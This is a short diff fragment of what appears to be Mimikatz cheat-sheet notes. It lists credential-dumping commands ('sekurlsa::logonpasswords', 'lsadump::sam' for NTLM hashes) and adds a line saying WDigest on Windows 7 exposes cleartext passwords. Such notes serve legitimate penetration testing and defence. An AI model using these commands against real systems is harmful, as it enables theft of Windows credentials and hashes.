@@ -10,3 +10,4 @@ sekurlsa::logonpasswords
 # Extract only NTLM hashes from SAM:
 lsadump::sam
 
+On older operating systems like Windows 7 WDigest11 is enabled. running Mimikatz will reveal cleartext passwords.
